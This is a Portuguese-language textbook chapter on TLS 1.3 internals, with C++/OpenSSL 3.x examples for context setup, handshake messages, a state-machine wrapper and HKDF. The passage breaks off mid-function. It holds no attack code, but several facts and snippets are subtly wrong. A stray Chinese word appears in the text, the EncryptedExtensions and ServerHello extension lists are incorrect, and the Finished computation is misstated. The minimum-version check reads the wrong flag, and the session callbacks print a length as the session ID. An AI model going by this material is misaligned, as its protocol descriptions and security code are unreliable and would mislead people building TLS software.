# Capítulo 05: TLS 1.3 — Internals e Implementação

## Objetivos de Aprendizado

Ao final deste capítulo, você será capaz de:

1. Compreender a evolução completa do TLS desde SSL 2.0 até TLS 1.3
2. Explicar cada fase do handshake TLS 1.3 e seu fluxo de mensagens
3. Implementar o Key Schedule usando HKDF para derivar chaves de tráfego
4. Entender os riscos e trade-offs do 0-RTT Early Data
5. Configurar OpenSSL 3.x para servidores e clientes TLS 1.3 em C++
6. Implementar um servidor TLS completo em C++17 com mais de 300 linhas
7. Implementar um cliente TLS completo em C++17
8. Analisar CVEs históricas: Heartbleed, OpenSSL key recovery, Raccoon Attack, ROBOT Attack
9. Utilizar ferramentas de teste como testssl.sh e sslyze
10. Realizar migração de TLS 1.2 para TLS 1.3 em ambientes de produção

TLS 1.3 não é apenas uma atualização incremental — é um redesign fundamentado em anos de pesquisa acadêmica e lições aprendidas com falhas de segurança em versões anteriores. Este capítulo mergulha nos detalhes internos do protocolo, suas implicações criptográficas e implementação prática em C++ com OpenSSL 3.x.

---

## 1. Evolução do TLS: SSL 2.0/3.0 → TLS 1.0/1.1/1.2 → TLS 1.3

### 1.1 SSL 2.0 (1995): O Início Problemático

O Secure Sockets Layer versão 2.0 foi a primeira tentativa da Netscape de criptografar comunicações na web. SSL 2.0 apresentava deficiências graves:

- **Handshake sem autenticação mútua**: O servidor não era obrigatoriamente autenticado
- **Cifras fraca**: Suporte a RC4 com chaves de 40 bits (export-grade)
- **Vulnerabilidade ao downgrade**: Atacantes podiam forçar o uso de cifras fracas
- **Falta de proteção contra replay**: Mensagens podiam ser reutilizadas
- **MAC truncado**: O Message Authentication Code era truncado para 16 bits
- **Não protegia o ClientHello**: O primeiro pacote do cliente era enviado em texto claro

Exemplo de como SSL 2.0 era rejeitado em servidores modernos:

```c++
// NUNCA habilite SSL 2.0 — código demonstrativo apenas
// Esta configuração deve ser rejeitada pelo OpenSSL 3.x

#include <openssl/ssl.h>
#include <openssl/err.h>

void demonstrate_ssl2_rejection() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_server_method());

    // OpenSSL 3.x removeu suporte a SSL 2.0
    // O método abaixo NÃO funciona e NÃO deve ser tentado
    // SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2); // Removido

    // Em OpenSSL 3.x, SSL 2.0 não existe mais
    // Se você encontrar código que tenta configurar SSL 2.0,
    // é código legado que precisa ser atualizado urgentemente

    SSL_CTX_free(ctx);
}
```

### 1.2 SSL 3.0 (1996): Progresso com Defeitos Fundamentais

SSL 3.0 corrigiu muitos problemas do SSL 2.0, mas introduziu novos e manteve alguns:

- **POODLE (CVE-2014-3566)**: Padding Oracle on Downgraded Legacy Encryption
  - Explorava o padding de bloco no CBC mode
  - Atacante podia decriptografar dados gradualmente
- **Mudança no cálculo de MAC**: Usava构造 hash diferente, mas ainda suscetível a ataques
- **Handshake em texto claro parcial**: Negociação era visível a intermediários
- **Sem proteção contra downgrade robusta**: Falta de mensagens de proteção

```c++
// SSL 3.0 deve ser DESABILITADO em qualquer ambiente de produção

#include <openssl/ssl.h>

void disable_ssl3_completely(SSL_CTX* ctx) {
    // Em OpenSSL 3.x, SSL 3.0 também foi removido
    // Apenas documentação do que existia:

    // Opção antiga (não disponível em OpenSSL 3.x):
    // SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv3);

    // Em OpenSSL 3.x, tente usar TLS 1.2 como mínimo:
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);

    // Verifique a versão mínima configurada
    long opts = SSL_CTX_get_options(ctx);
    std::cout << "TLS mínimo configurado: "
              << ((opts & SSL_OP_NO_TLSv1_2) ? "TLS 1.3" : "TLS 1.2+")
              << std::endl;
}
```

### 1.3 TLS 1.0 (1999): O Padrão RFC 2246

TLS 1.0 foi a primeira versão padronizada pela IETF, baseada em SSL 3.0 com melhorias:

- **Proteção contra truncate**: Tratamento correto do fechamento de conexão
- **Versão no handshake**: Uso adequado de versionamento
- **CBC mode com proteção**: Apesar de ainda ter vulnerabilidades

Vulnerabilidades conhecidas em TLS 1.0:

- **BEAST (CVE-2011-3389)**: Browser Exploit Against SSL/TLS
  - Explorava a previsibilidade do IV no CBC mode
  - Atacante podia injetar dados e recuperar cookies
- **POODLE TLS**: Variantes do ataque original
- **Falta de proteção contra downgrade adequada**

```c++
// TLS 1.0 e 1.1 foram formalmente descontinuados pela IETF (RFC 8996)
// NUNCA use em produção

void enforce_tls_minimum(SSL_CTX* ctx) {
    // Forçar TLS 1.2 como mínimo absoluto
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);

    // Verificar suporte do sistema
    int has_tls10 = 0, has_tls11 = 0, has_tls12 = 0, has_tls13 = 0;

    // OpenSSL 3.x não suporta TLS 1.0/1.1 por padrão
    // Verifique seus protocolos habilitados
    const SSL_METHOD* method = TLS_server_method();
    SSL_CTX* test_ctx = SSL_CTX_new(method);

    if (test_ctx) {
        // Testar cada versão
        if (SSL_CTX_set_min_proto_version(test_ctx, TLS1_VERSION) == 1)
            has_tls10 = 1;
        if (SSL_CTX_set_min_proto_version(test_ctx, TLS1_1_VERSION) == 1)
            has_tls11 = 1;
        if (SSL_CTX_set_min_proto_version(test_ctx, TLS1_2_VERSION) == 1)
            has_tls12 = 1;
        if (SSL_CTX_set_min_proto_version(test_ctx, TLS1_3_VERSION) == 1)
            has_tls13 = 1;

        SSL_CTX_free(test_ctx);
    }

    std::cout << "TLS 1.0: " << (has_tls10 ? "HABILITADO" : "desabilitado") << "\n";
    std::cout << "TLS 1.1: " << (has_tls11 ? "HABILITADO" : "desabilitado") << "\n";
    std::cout << "TLS 1.2: " << (has_tls12 ? "HABILITADO" : "desabilitado") << "\n";
    std::cout << "TLS 1.3: " << (has_tls13 ? "HABILITADO" : "desabilitado") << "\n";
}
```

### 1.4 TLS 1.1 (2006): RFC 4346

TLS 1.1 adicionou:

- **IV explícito para CBC**: Prevenção contra BEAST
- **Tratamento de padding**: Mais robusto que TLS 1.0
- **Suporte a modos de cifra**: Expansão de opções

No entanto, ainda mantinha:

- **Handshake de 2 round-trips**
- **Suporte a cifras fracas**
- **Sem forward secrecy obrigatório**
- **MAC-then-encrypt**: Abordagem inferior ao Encrypt-then-MAC

### 1.5 TLS 1.2 (2008): RFC 5246

TLS 1.2 trouxe melhorias significativas:

- **SHA-256 como hash padrão**: Substituição do MD5 e SHA-1
- **Suporte a AEAD**: Authenticated Encryption with Associated Data
- **Galois/Counter Mode (GCM)**: Nova cifra recomendada
- **Remoção de cifras antigas**: DES, RC4, MD5
- **Suporte a extensões**: Mais flexibilidade no handshake

Exemplo de configuração TLS 1.2 moderna (ancorado no contexto do capítulo):

```c++
// TLS 1.2 com configuração moderna em OpenSSL 3.x

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>

#include <iostream>
#include <string>

class Tls12Context {
public:
    Tls12Context() : ctx_(nullptr) {
        ctx_ = SSL_CTX_new(TLS_server_method());
        if (!ctx_) {
            throw std::runtime_error("Falha ao criar SSL_CTX");
        }
        configure_context();
    }

    ~Tls12Context() {
        if (ctx_) {
            SSL_CTX_free(ctx_);
        }
    }

    SSL_CTX* get() const { return ctx_; }

private:
    SSL_CTX* ctx_;

    void configure_context() {
        // TLS 1.2 como versão mínima (TLS 1.3 também habilitado)
        SSL_CTX_set_min_proto_version(ctx_, TLS1_2_VERSION);

        // Configurar cifras modernas e seguras
        // Em OpenSSL 3.x, o cipher string é mais restritivo
        const char* cipher_list =
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256";

        if (SSL_CTX_set_cipher_list(ctx_, cipher_list) != 1) {
            ERR_print_errors_fp(stderr);
            throw std::runtime_error("Falha ao configurar cifras");
        }

        // Habilitar SNI callback
        SSL_CTX_set_tlsext_servername_callback(ctx_, sni_callback);

        // Configurar sessões para performance
        SSL_CTX_set_session_cache_mode(ctx_, SSL_SESS_CACHE_SERVER);
        SSL_CTX_sess_set_cache_size(ctx_, 1024);

        // Configurar OCSP Stapling
        SSL_CTX_set_tlsext_status_type(ctx_, TLSEXT_STATUSTYPE_ocsp);

        std::cout << "Contexto TLS 1.2+ configurado com sucesso\n";
    }

    static int sni_callback(SSL* ssl, int* ad, void* arg) {
        const char* servername = SSL_get_servername(ssl, TLSEXT_NAMETYPE_host_name);
        if (servername) {
            std::cout << "SNI: " << servername << "\n";
        }
        return SSL_TLSEXT_ERR_OK;
    }
};
```

### 1.6 TLS 1.3 (2018): RFC 8446 — O Redesign Completo

TLS 1.3 representou a maior mudança no protocolo desde sua criação. As mudanças incluem:

**Segurança Aprimorada:**
- **Forward Secrecy obrigatório**: Todas as cifras usam DH ou ECDH
- **Remoção de cifras antigas**: Sem RSA key exchange, sem CBC, sem RC4
- **HKDF para derivação de chaves**: Substituição do PRF improvisado
- **Encrypt-then-MAC implementado corretamente**: AEAD sempre

**Performance:**
- **1-RTT handshake**: Redução de 2 round-trips para 1
- **0-RTT Early Data**: Possibilidade de envio imediato
- **Resolução de sessão simplificada**: PSK (Pre-Shared Key)

**Simplicidade:**
- **Handshake simplificado**: Menos mensagens, menos complexidade
- **Extensões negociadas**: Apenas as necessárias são enviadas
- **Remoção de opções obsoletas**: Limpeza radical do protocolo

```c++
// TLS 1.3: A nova configuração moderna

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/core_names.h>
#include <openssl/param_build.h>

#include <iostream>

class ModernTlsContext {
public:
    ModernTlsContext() : ctx_(nullptr) {
        ctx_ = SSL_CTX_new(TLS_server_method());
        if (!ctx_) {
            throw std::runtime_error("Falha ao criar contexto TLS");
        }
        configure_tls13();
    }

    ~ModernTlsContext() {
        if (ctx_) SSL_CTX_free(ctx_);
    }

    bool load_certificate(const char* cert_path, const char* key_path) {
        if (SSL_CTX_use_certificate_chain_file(ctx_, cert_path) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        if (SSL_CTX_use_PrivateKey_file(ctx_, key_path, SSL_FILETYPE_PEM) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        if (SSL_CTX_check_private_key(ctx_) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        std::cout << "Certificado e chave carregados com sucesso\n";
        return true;
    }

    SSL_CTX* get() const { return ctx_; }

private:
    SSL_CTX* ctx_;

    void configure_tls13() {
        // TLS 1.3 como versão mínima e máxima
        SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx_, TLS1_3_VERSION);

        // Configurar grupos de curvas para TLS 1.3
        // TLS 1.3 usa grupos de curvas, não apenas curvas individuais
        const char* groups = "X25519:P-256:P-384:P-521";
        if (SSL_CTX_set1_groups_list(ctx_, groups) != 1) {
            ERR_print_errors_fp(stderr);
            throw std::runtime_error("Falha ao configurar grupos de curvas");
        }

        // Configurar cifras TLS 1.3 (formato diferente de TLS 1.2)
        const char* ciphersuites =
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256";

        if (SSL_CTX_set_ciphersuites(ctx_, ciphersuites) != 1) {
            ERR_print_errors_fp(stderr);
            throw std::runtime_error("Falha ao configurar cifras TLS 1.3");
        }

        // Habilitar Early Data (0-RTT) — USE COM CUIDADO
        // SSL_CTX_set_max_early_data(ctx_, 16384);

        // Configurar callbacks de sessão
        SSL_CTX_set_session_cache_mode(ctx_, SSL_SESS_CACHE_SERVER);
        SSL_CTX_sess_set_new_cb(ctx_, new_session_callback);
        SSL_CTX_sess_set_remove_cb(ctx_, remove_session_callback);

        // Configurar ALPN (Application-Layer Protocol Negotiation)
        const unsigned char alpn[] = {2, 'h', '2', 8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
        SSL_CTX_set_alpn_protos(ctx_, alpn, sizeof(alpn));

        // Habilitar OCSP Stapling
        SSL_CTX_set_tlsext_status_type(ctx_, TLSEXT_STATUSTYPE_ocsp);

        std::cout << "TLS 1.3 configurado com sucesso\n";
        std::cout << "  Cifras: AES-256-GCM, CHACHA20-POLY1305, AES-128-GCM\n";
        std::cout << "  Curvas: X25519, P-256, P-384, P-521\n";
    }

    static void new_session_callback(SSL* ssl, SSL_SESSION* session) {
        // Callback chamado quando uma nova sessão é criada
        // Ideal para implementar persistência de sessões
        unsigned int session_id;
        const unsigned char* id = SSL_SESSION_get_session_id(session, &session_id);
        std::cout << "Nova sessão criada (ID: "
                  << std::hex << session_id << ")\n";
    }

    static void remove_session_callback(SSL_CTX* ctx, SSL_SESSION* session) {
        // Callback chamado quando uma sessão é removida do cache
        unsigned int session_id;
        const unsigned char* id = SSL_SESSION_get_session_id(session, &session_id);
        std::cout << "Sessão removida do cache (ID: "
                  << std::hex << session_id << ")\n";
    }
};
```

---

## 2. TLS 1.3 Handshake: ClientHello → ServerHello → Finished

### 2.1 Visão Geral do Handshake

O handshake TLS 1.3 é significativamente simplificado em comparação com TLS 1.2. O fluxo completo envolve:

**Para uma conexão nova (1-RTT):**

```
Cliente                          Servidor
  |                                |
  |  ClientHello                   |
  |  (grupos, cifras, key_share)   |
  |------------------------------->|
  |                                |
  |  ServerHello                   |
  |  (grupo, key_share)            |
  |  EncryptedExtensions           |
  |  CertificateRequest (opcional) |
  |  Certificate                   |
  |  CertificateVerify             |
  |  Finished                      |
  |<-------------------------------|
  |                                |
  |  [Certificate] (opcional)      |
  |  Finished                      |
  |------------------------------->|
  |                                |
  |  === CONEXÃO ESTABELECIDA ===  |
  |  Dados criptografados...       |
```

**Para sessões com PSK (0-RTT):**

```
Cliente                          Servidor
  |                                |
  |  ClientHello                   |
  |  (psk_key_exchange_modes,      |
  |   pre_shared_key, early_data)  |
  |------------------------------->|
  |                                |
  |  [Early Data]                  |
  |------------------------------->|
  |                                |
  |  ServerHello                   |
  |  (pre_shared_key)              |
  |  EncryptedExtensions           |
  |  Finished                      |
  |<-------------------------------|
  |                                |
  |  Finished                      |
  |------------------------------->|
```

### 2.2 Detalhamento das Mensagens

#### 2.2.1 ClientHello

O ClientHello é a primeira mensagem e contém todas as opções suportadas pelo cliente:

```
ClientHello {
    ProtocolVersion legacy_version = 0x0303;  // Sempre 3.3 (TLS 1.2 compat)
    Random random[32];
    SessionID legacy_session_id<0..32>;
    CipherSuite cipher_suites<2..2^16-2>;
    CompressionMethod legacy_compression_methods<1..2^8-1>;
    Extension extensions<2..2^16-1>;
}

Extension extensions {
    supported_versions (TLS 1.3)
    key_share (grupos de curvas suportados)
    signature_algorithms (algoritmos de assinatura)
    supported_groups (grupos de curvas)
    psk_key_exchange_modes (modos PSK)
    pre_shared_key (se for resumption)
    early_data (se usar 0-RTT)
    server_name (SNI)
    signature_algorithms_cert (algoritmos para certificados)
    padding (para anti-fingerprinting)
}
```

Implementação do ClientHello em C++:

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/core_names.h>
#include <openssl/param_build.h>
#include <openssl/rand.h>

#include <iostream>
#include <vector>
#include <array>
#include <cstring>
#include <functional>

struct ClientHelloInfo {
    std::string server_name;
    std::vector<std::string> supported_groups;
    std::vector<std::string> signature_algorithms;
    std::vector<std::string> cipher_suites;
    bool early_data_requested{false};
    std::vector<uint8_t> psk_identity;
};

class Tls13Handshake {
public:
    Tls13Handshake() : ssl_(nullptr), ctx_(nullptr) {}

    ~Tls13Handshake() {
        if (ssl_) SSL_free(ssl_);
        if (ctx_) SSL_CTX_free(ctx_);
    }

    bool initialize_client(const std::string& server_name) {
        ctx_ = SSL_CTX_new(TLS_client_method());
        if (!ctx_) {
            print_errors("Falha ao criar contexto cliente");
            return false;
        }

        // Configurar TLS 1.3 como única versão
        SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx_, TLS1_3_VERSION);

        // Configurar cifras TLS 1.3
        const char* ciphersuites =
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256";

        if (SSL_CTX_set_ciphersuites(ctx_, ciphersuites) != 1) {
            print_errors("Falha ao configurar cifras");
            return false;
        }

        // Configurar grupos de curvas
        const char* groups = "X25519:P-256:P-384:P-521";
        if (SSL_CTX_set1_groups_list(ctx_, groups) != 1) {
            print_errors("Falha ao configurar grupos de curvas");
            return false;
        }

        // Configurar algoritmos de assinatura suportados
        const char* sigalgs =
            "ECDSA-SECP256r1-SHA256:"
            "ECDSA-SECP384r1-SHA384:"
            "ECDSA-SECP521r1-SHA512:"
            "RSA-PSS-RSAE-SHA256:"
            "RSA-PSS-RSAE-SHA384:"
            "RSA-PSS-RSAE-SHA512:"
            "RSA-SHA256:"
            "RSA-SHA384:"
            "RSA-SHA512";

        if (SSL_CTX_set1_sigalgs_list(ctx_, sigalgs) != 1) {
            print_errors("Falha ao configurar algoritmos de assinatura");
            return false;
        }

        // Criar objeto SSL
        ssl_ = SSL_new(ctx_);
        if (!ssl_) {
            print_errors("Falha ao criar objeto SSL");
            return false;
        }

        // Configurar Server Name Indication (SNI)
        if (!SSL_set_tlsext_host_name(ssl_, server_name.c_str())) {
            print_errors("Falha ao configurar SNI");
            return false;
        }

        // Configurar verificação de hostname
        SSL_set1_host(ssl_, server_name.c_str());

        // Habilitar verificação de certificado
        SSL_set_verify(ssl_, SSL_VERIFY_PEER, nullptr);

        std::cout << "Cliente TLS 1.3 inicializado para: " << server_name << "\n";
        return true;
    }

    bool perform_handshake(int sockfd) {
        if (!ssl_) {
            std::cerr << "SSL não inicializado\n";
            return false;
        }

        // Associar socket ao objeto SSL
        SSL_set_fd(ssl_, sockfd);

        // Iniciar handshake
        int ret = SSL_connect(ssl_);
        if (ret != 1) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }

        // Verificar que TLS 1.3 foi negociado
        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl_);
        if (cipher) {
            const char* cipher_name = SSL_CIPHER_get_name(cipher);
            int version = SSL_CIPHER_get_protocol_id(cipher);

            std::cout << "Handshake concluído:\n";
            std::cout << "  Protocolo: TLS 1.3\n";
            std::cout << "  Cifra: " << cipher_name << "\n";
        }

        // Verificar versão do protocolo
        int proto_version = SSL_version(ssl_);
        if (proto_version != TLS1_3_VERSION) {
            std::cerr << "WARN: TLS 1.3 não foi negociado. Versão: "
                      << SSL_get_version(ssl_) << "\n";
        }

        return true;
    }

    bool send_data(const std::vector<uint8_t>& data) {
        int ret = SSL_write(ssl_, data.data(), data.size());
        if (ret <= 0) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }
        return true;
    }

    std::vector<uint8_t> receive_data() {
        std::vector<uint8_t> buffer(4096);
        int ret = SSL_read(ssl_, buffer.data(), buffer.size());
        if (ret > 0) {
            buffer.resize(ret);
            return buffer;
        }
        return {};
    }

    void print_connection_info() const {
        if (!ssl_) return;

        std::cout << "\n=== Informações da Conexão TLS 1.3 ===\n";
        std::cout << "Versão: " << SSL_get_version(ssl_) << "\n";

        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl_);
        if (cipher) {
            std::cout << "Cifra: " << SSL_CIPHER_get_name(cipher) << "\n";
            std::cout << "Bits: " << SSL_CIPHER_get_bits(cipher) << "\n";
            std::cout << "Descrição: " << SSL_CIPHER_description(cipher, nullptr, 0) << "\n";
        }

        // Verificar certificado
        X509* cert = SSL_get_peer_certificate(ssl_);
        if (cert) {
            char subject[256], issuer[256];
            X509_NAME_oneline(X509_get_subject_name(cert), subject, sizeof(subject));
            X509_NAME_oneline(X509_get_issuer_name(cert), issuer, sizeof(issuer));

            std::cout << "Subject: " << subject << "\n";
            std::cout << "Issuer: " << issuer << "\n";

            // Verificar validade
            ASN1_TIME* not_before = X509_get0_notBefore(cert);
            ASN1_TIME* not_after = X509_get0_notAfter(cert);
            std::cout << "Válido de: " << format_asn1_time(not_before) << "\n";
            std::cout << "Válido até: " << format_asn1_time(not_after) << "\n";

            X509_free(cert);
        }

        std::cout << "========================================\n";
    }

    SSL* get_ssl() const { return ssl_; }

private:
    SSL* ssl_;
    SSL_CTX* ctx_;

    void print_errors(const char* msg) const {
        std::cerr << msg << "\n";
        ERR_print_errors_fp(stderr);
    }

    void print_ssl_errors(int err) const {
        switch (err) {
            case SSL_ERROR_SSL:
                std::cerr << "Erro SSL interno:\n";
                ERR_print_errors_fp(stderr);
                break;
            case SSL_ERROR_SYSCALL:
                std::cerr << "Erro de sistema: " << strerror(errno) << "\n";
                break;
            case SSL_ERROR_ZERO_RETURN:
                std::cerr << "Conexão fechada pelo peer\n";
                break;
            default:
                std::cerr << "Erro SSL desconhecido: " << err << "\n";
        }
    }

    std::string format_asn1_time(const ASN1_TIME* time) const {
        char buf[64];
        BIO* bio = BIO_new(BIO_s_mem());
        ASN1_TIME_print(bio, time);
        int len = BIO_read(bio, buf, sizeof(buf) - 1);
        BIO_free(bio);
        if (len >= 0) buf[len] = '\0';
        return std::string(buf);
    }
};
```

#### 2.2.2 ServerHello

O ServerHello é a resposta do servidor e contém as escolhas finais:

```
ServerHello {
    ProtocolVersion legacy_version = 0x0303;
    Random random[32];
    SessionID legacy_session_id;
    CipherSuite cipher_suite;
    CompressionMethod legacy_compression_method = null;
    Extension extensions;
}

Extensions do ServerHello:
    - supported_versions: confirma TLS 1.3
    - key_share: compartilha a chave pública DH/ECDH
    - pre_shared_key: se for resumption com PSK
    - encrypted_extensions: extensões que precisam ser protegidas
```

#### 2.2.3 Encrypted Extensions

Após o ServerHello, todas as mensagens são criptografadas:

```
EncryptedExtensions {
    Extension extensions<0..2^16-1>;
}

Extensões incluídas:
    - server_name: confirmação do SNI
    - max_fragment_length
    - client_certificate_url
    - trusted_ca_keys
    - heartbeat
    - application_layer_protocol_negotiation (ALPN)
    - signed_certificate_timestamp
    - client_cert_type
    - server_cert_type
    - session_ticket
    - early_data (se aplicável)
    - supported_versions
    - cookie
```

#### 2.2.4 Certificate e CertificateVerify

O servidor envia seu certificado e prova de posse da chave privada:

```
Certificate {
    CertificateRequestContext request_context<0..2^8-1>;
    CertificateList certificate_list<1..2^24-1>;
}

CertificateList {
    opaque ASN1_cert<1..2^24-1>;
    Extension extensions<0..2^16-1>;
}

CertificateVerify {
    SignatureAlgorithm algorithm;
    opaque signature<0..2^16-1>;
}

A assinatura é calculada sobre:
    Hash(Handshake Context + Certificate)
```

#### 2.2.5 Finished

A mensagem Finished é o MAC de todo o handshake:

```
Finished {
    verify_data[Hash.length];
}

verify_data = HMAC(finished_key,
                   Hash(Handshake Context +
                        CertificateVerify +
                        empty Hash))
```

### 2.3 Handshake State Machine em C++

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/core_names.h>

#include <iostream>
#include <functional>
#include <memory>
#include <string>

enum class HandshakeState {
    IDLE,
    CLIENT_HELLO_SENT,
    SERVER_HELLO_RECEIVED,
    ENCRYPTED_EXTENSIONS_RECEIVED,
    CERTIFICATE_RECEIVED,
    CERTIFICATE_VERIFY_RECEIVED,
    SERVER_FINISHED_RECEIVED,
    CLIENT_FINISHED_SENT,
    COMPLETED,
    FAILED
};

class Tls13HandshakeStateMachine {
public:
    using StateCallback = std::function<void(HandshakeState, const std::string&)>;

    explicit Tls13HandshakeStateMachine(SSL* ssl)
        : ssl_(ssl), state_(HandshakeState::IDLE) {
        setup_transitions();
    }

    bool start_handshake() {
        transition_to(HandshakeState::IDLE, "Iniciando handshake TLS 1.3");

        // Para cliente: enviar ClientHello
        int ret = SSL_do_handshake(ssl_);
        if (ret != 1) {
            int err = SSL_get_error(ssl_, ret);
            if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) {
                // Handshake interrompendo - pode ser assíncrono
                return false;
            }
            transition_to(HandshakeState::FAILED, "Handshake falhou");
            return false;
        }

        transition_to(HandshakeState::COMPLETED, "Handshake concluído");
        return true;
    }

    void set_state_callback(StateCallback cb) {
        callback_ = std::move(cb);
    }

    HandshakeState get_state() const { return state_; }

    std::string get_state_name() const {
        return state_to_string(state_);
    }

private:
    SSL* ssl_;
    HandshakeState state_;
    StateCallback callback_;

    void transition_to(HandshakeState new_state, const std::string& msg) {
        HandshakeState old_state = state_;
        state_ = new_state;

        if (callback_) {
            callback_(new_state, msg);
        }

        log_transition(old_state, new_state, msg);
    }

    void log_transition(HandshakeState from, HandshakeState to, const std::string& msg) {
        std::cout << "[TLS 1.3] " << state_to_string(from)
                  << " -> " << state_to_string(to)
                  << ": " << msg << "\n";
    }

    std::string state_to_string(HandshakeState s) const {
        switch (s) {
            case HandshakeState::IDLE: return "IDLE";
            case HandshakeState::CLIENT_HELLO_SENT: return "CLIENT_HELLO_SENT";
            case HandshakeState::SERVER_HELLO_RECEIVED: return "SERVER_HELLO_RECEIVED";
            case HandshakeState::ENCRYPTED_EXTENSIONS_RECEIVED: return "ENC_EXT_RECEIVED";
            case HandshakeState::CERTIFICATE_RECEIVED: return "CERT_RECEIVED";
            case HandshakeState::CERTIFICATE_VERIFY_RECEIVED: return "CERT_VERIFY_RECEIVED";
            case HandshakeState::SERVER_FINISHED_RECEIVED: return "SRV_FINISHED";
            case HandshakeState::CLIENT_FINISHED_SENT: return "CLT_FINISHED";
            case HandshakeState::COMPLETED: return "COMPLETED";
            case HandshakeState::FAILED: return "FAILED";
        }
        return "UNKNOWN";
    }

    void setup_transitions() {
        // O state machine real é interno ao OpenSSL
        // Este é um wrapper para observabilidade
    }
};

// Exemplo de uso com polling assíncrono
void async_handshake_example(SSL* ssl, int sockfd) {
    Tls13HandshakeStateMachine sm(ssl);

    sm.set_state_callback([](HandshakeState state, const std::string& msg) {
        std::cout << "State transition: " << msg << "\n";
    });

    // Handshake com suporte a non-blocking I/O
    bool done = false;
    while (!done) {
        int ret = SSL_do_handshake(ssl);

        if (ret == 1) {
            done = true;
            std::cout << "Handshake concluído com sucesso\n";
        } else {
            int err = SSL_get_error(ssl, ret);
            switch (err) {
                case SSL_ERROR_WANT_READ:
                    // Aguardar dados do socket
                    // Em produção: usar poll/select/epoll
                    {
                        fd_set readfds;
                        FD_ZERO(&readfds);
                        FD_SET(sockfd, &readfds);

                        struct timeval tv;
                        tv.tv_sec = 5;
                        tv.tv_usec = 0;

                        int sel = select(sockfd + 1, &readfds, nullptr, nullptr, &tv);
                        if (sel < 0) {
                            perror("select");
                            return;
                        }
                        if (sel == 0) {
                            std::cerr << "Timeout no handshake\n";
                            return;
                        }
                    }
                    break;

                case SSL_ERROR_WANT_WRITE:
                    // Em produção: aguardar socket ser escrevível
                    break;

                default:
                    std::cerr << "Erro fatal no handshake: " << err << "\n";
                    ERR_print_errors_fp(stderr);
                    return;
            }
        }
    }

    std::cout << "Handshake TLS 1.3 concluído!\n";
}
```

---

## 3. Key Schedule: HKDF, Handshake Traffic, Application Traffic

### 3.1 Hierarquia de Chaves no TLS 1.3

O TLS 1.3 introduziu um modelo de derivação de chaves baseado no HKDF (HMAC-based Key Derivation Function), definido no RFC 5869. Este modelo é significativamente mais seguro que o PRF improvisado do TLS 1.2.

**Hierarquia de chaves:**

```
Early Secret (ES)
    |
    v
Handshake Secret (HS) → Handshake Traffic Keys
    |
    v
Master Secret (MS)
    |
    v
Application Traffic Secret (ATS) → Application Traffic Keys
    |
    v
Exporter Secret → Chaves para EXPORTER
```

### 3.2 HKDF: HMAC-based Key Derivation Function

O HKDF consiste em duas fases:

1. **Extract**: Extrai um pseudorandom key (PRK) do input usando um salt
2. **Expand**: Expande o PRK para o tamanho desejado de chave

```c++
#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/rand.h>
#include <openssl/core_names.h>
#include <openssl/param_build.h>

#include <iostream>
#include <vector>
#include <array>
#include <cstring>

class HkdfDerivation {
public:
    // Tamanho máximo de saída do HKDF-SHA384
    static constexpr size_t MAX_HKDF_OUTPUT = 255 * 48; // 48 bytes por round

    // Tamanhos de hash para cada cifra-suíte TLS 1.3
    enum class HashAlgorithm {
        SHA256 = 32,
        SHA384 = 48
    };

    HkdfDerivation(HashAlgorithm hash_algo = HashAlgorithm::SHA256)
        : hash_algo_(hash_algo), hash_size_(static_cast<size_t>(hash_algo)) {
        setup_hash();
    }

    ~HkdfDerivation() {
        cleanup();
    }

    // HKDF-Extract: Extrai PRK do input
    std::vector<uint8_t> extract(const std::vector<uint8_t>& salt,
                                  const std::vector<uint8_t>& ikm) {
        std::vector<uint8_t> prk(hash_size_);

        EVP_MAC* mac = EVP_MAC_fetch(nullptr, "HMAC", nullptr);
        EVP_MAC_CTX* ctx = EVP_MAC_CTX_new(mac);

        // Configurar parâmetros OSSL_PARAM para HKDF
        OSSL_PARAM params[] = {
            OSSL_PARAM_construct_utf8_string("digest",
                                              const_cast<char*>(get_digest_name()), 0),
            OSSL_PARAM_END
        };

        if (EVP_MAC_init(ctx, salt.data(), salt.size(), params) != 1) {
            EVP_MAC_CTX_free(ctx);
            EVP_MAC_free(mac);
            return {};
        }

        if (EVP_MAC_update(ctx, ikm.data(), ikm.size()) != 1) {
            EVP_MAC_CTX_free(ctx);
            EVP_MAC_free(mac);
            return {};
        }

        size_t out_len = 0;
        if (EVP_MAC_final(ctx, prk.data(), &out_len, prk.size()) != 1) {
            EVP_MAC_CTX_free(ctx);
            EVP_MAC_free(mac);
            return {};
        }

        EVP_MAC_CTX_free(ctx);
        EVP_MAC_free(mac);

        return prk;
    }

    // HKDF-Expand: Expande PRK para tamanho desejado
    std::vector<uint8_t> expand(const std::vector<uint8_t>& prk,
